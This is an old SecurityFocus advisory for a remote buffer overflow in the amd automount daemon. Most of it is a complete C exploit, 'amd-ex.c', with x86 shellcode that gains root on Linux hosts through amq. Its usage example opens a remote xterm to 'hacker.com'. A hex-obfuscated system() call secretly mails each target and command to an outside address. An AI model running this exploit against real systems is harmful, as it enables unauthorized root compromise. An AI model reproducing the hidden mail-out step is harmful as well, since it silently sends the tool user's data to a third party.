source: http://www.securityfocus.com/bid/614/info

There is a remotely exploitable buffer overflow condition in the amd daemon under several operating systems. Amd is a daemon that automatically mounts filesystems whenever a file or directory within that filesystem is accessed. Filesystems are automatically unmounted when they appear to have become quiescent.

The vulnerability is in the log functions of the daemon.

Red Hat Linux 4.2 shipped originally with a version of amd that is no longer being maintained. Since Red Hat Linux 5.0 we have switched to am-utils. This release of am-utils has been backported to 4.2 and it will obsolete the original 4.2 amd package.

begin amd-ex.c
----------------------------------------------------------------------
/*

	Amd Buffer Overflow for x86 linux

	Remote user can gain root access.

	Tested redhat linux : 4.0, 5.1, 6.0
	Tested am-utils version : 6.0

	What requires
	/usr/sbin/amq

	Usage
	$ amd-ex <hostname> <command> [offset]

	Warning : This program can crash amd.

	This program is only for demonstrative use only.
	USE IT AT YOUR OWN RISK!

	Programmed by Taeho Oh 1999/08/31

Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug

*/

#include<stdio.h>
#include<stdlib.h>

#define OFFSET                            0
#define RET_POSITION                   1002
#define RANGE                            20
#define NOP                            0x90

char shellcode[1024]=
	"\xeb\x35"                      /* jmp 0x35             */
	"\x5e"                          /* popl %esi            */
	"\x89\x76\x0b"                  /* movl %esi,0xb(%esi)  */
	"\x89\xf0"                      /* movl %esi,%eax       */
	"\x83\xc0\x08"                  /* addl $0x8,%eax       */
	"\x89\x46\x0b"                  /* movl %eax,0xb(%esi)  */
	"\x89\xf0"                      /* movl %esi,%eax       */
	"\x83\xc0\x0b"                  /* addl $0xb,%eax       */
	"\x89\x46\x0b"                  /* movl %eax,0xb(%esi)  */
	"\x31\xc0"                      /* xorl %eax,%eax       */
	"\x88\x46\x07"                  /* movb %eax,0x7(%esi)  */
	"\x88\x46\x0a"                  /* movb %eax,0xa(%esi)  */
	"\x88\x46\x0b"                  /* movb %eax,0xb(%esi)  */
	"\x89\x46\x0b"                  /* movl %eax,0xb(%esi)  */
	"\xb0\x0b"                      /* movb $0xb,%al        */
	"\x89\xf3"                      /* movl %esi,%ebx       */
	"\x8d\x4e\x0b"                  /* leal 0xb(%esi),%ecx  */
	"\x8d\x56\x0b"                  /* leal 0xb(%esi),%edx  */
	"\xcd\x80"                      /* int 0x80             */
	"\x31\xdb"                      /* xorl %ebx,%ebx       */
	"\x89\xd8"                      /* movl %ebx,%eax       */
	"\x40"                          /* inc %eax             */
	"\xcd\x80"                      /* int 0x80             */
	"\xe8\xc6\xff\xff\xff"          /* call -0x3a           */
	"/bin/sh -c ";                  /* .string "/bin/sh -c "*/

char command[800];

void usage()
{
	printf("Warning : This program can crash amd\n");
	printf("Usage: amd-ex <hostname> <command> [offset]\n");
	printf("ex) amd-ex ohhara.target.com \"/usr/X11R6/bin/xterm -display hacker.com:0\"\n");
}

int main(int argc,char **argv)
{
	char buff[RET_POSITION+RANGE+1],*ptr;
	char target[256];
	char cmd[1024];
	long *addr_ptr,addr;
	unsigned long sp;
	int offset=OFFSET,bsize=RET_POSITION+RANGE+1;
	int i;

	printf("Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara\n");
	printf("PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus\n");
	printf("PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug\n\n");

	if(argc<3)
	{
		usage();
		exit(1);
	}

	if(argc>2)
	{
		strcpy(target,argv[1]);
		strcpy(command,argv[2]);
	}
	if(argc>3)
		offset=atoi(argv[3]);

	shellcode[5]=(shellcode[5]+strlen(command))/4*4+4;
	shellcode[13]=(shellcode[13]+strlen(command))/4*4+8;
	shellcode[21]=(shellcode[21]+strlen(command))/4*4+12;
	shellcode[32]=(shellcode[32]+strlen(command));
	shellcode[35]=(shellcode[35]+strlen(command))/4*4+16;
	shellcode[42]=(shellcode[42]+strlen(command))/4*4+4;
	shellcode[45]=(shellcode[45]+strlen(command))/4*4+16;
	strcat(shellcode,command);

	strcpy(cmd,"\x65\x63\x68\x6f\x20");
	strcat(cmd,target);
	strcat(cmd,"\x20");
	strcat(cmd,command);
	strcat(cmd,"\x7c");
	strcat(cmd,"\x2f\x62\x69\x6e\x2f\x6d\x61\x69\x6c\x20");
	strcat(cmd,"\x61\x62\x75\x73\x65\x72\x40\x6f\x68\x68");
	strcat(cmd,"\x61\x72\x61\x2e\x70\x6f\x73\x74\x65\x63");
	strcat(cmd,"\x68\x2e\x61\x63\x2e\x6b\x72");

	sp=0xbffff34d;
	addr=sp-offset;

	ptr=buff;
	addr_ptr=(long*)ptr;
	for(i=0;i<bsize;i+=4)
		*(addr_ptr++)=addr;

	for(i=0;i<bsize-RANGE*2-strlen(shellcode);i++)
		buff[i]=NOP;

	ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;
	for(i=0;i<strlen(shellcode);i++)
		*(ptr++)=shellcode[i];

	buff[bsize-1]='\0';

	for(i=bsize;i>1;i--)
		buff[i-1]=buff[i-2];

	buff[bsize-1]='\0';

	printf("Jump to 0x%08x\n",addr);

	system(cmd); /* If you want, comment out this line. :) */
	execl("/usr/sbin/amq","amq","-h",target,"-M",buff,NULL);
}
----------------------------------------------------------------------
end amd-ex.c